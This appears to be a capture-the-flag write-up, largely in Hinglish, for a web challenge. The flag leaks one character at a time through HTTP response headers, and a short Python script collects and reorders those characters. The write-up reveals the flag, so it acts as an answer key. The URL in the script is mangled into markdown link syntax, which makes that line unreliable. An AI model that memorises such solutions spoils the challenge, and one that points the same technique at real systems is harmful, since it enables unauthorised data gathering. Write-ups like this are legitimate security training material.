# CTF Writeup: Web 1 — Main 07 Telemetry

- Challenge: Web 1
- Target: http://web.secleaf.xyz:8080/
- Category: Web
- Flag: SecLeaf{h34d3r5_l34k_0n3_dr1p_4t_4_t1m3}

---

## 1. Description & Clues
Website par inspection karne ke baad incident log aur HTTP response headers me key clues mile:
- Headers me information leak ho rahi thi (`X-Drip` aur `X-Drip-Serial`).
- Har refresh par flag ka ek single character (drop) milta tha.
- `work_order` naam ki session cookie har request ke sath bhejna zaroori tha, varna state reset ho jata.
- Characters random order me aate the, lekin unka index `serial` me diya hua tha (jaise 1/40, 12/40).

---

## 2. Exploitation (Python Script)
Cookie session maintain karne aur 40 characters ko serial order me arrange karne ke liye Python script use ki:

```python
import requests

url = "[http://web.secleaf.xyz:8080/](http://web.secleaf.xyz:8080/)"
s = requests.Session()
flag = {}

print("[*] Collecting flag characters...")

while len(flag) < 40:
    r = s.get(url)
    char = r.headers.get("X-Drip")
    serial = r.headers.get("X-Drip-Serial")
    
    if char and serial:
        idx = int(serial.split("/")[0])
        if idx not in flag:
            flag[idx] = char
            print(f"[+] Got {serial}: '{char}' | Total: {len(flag)}/40")

final_flag = "".join(flag[i] for i in sorted(flag.keys()))
print("\n[✓] Flag:", final_flag)
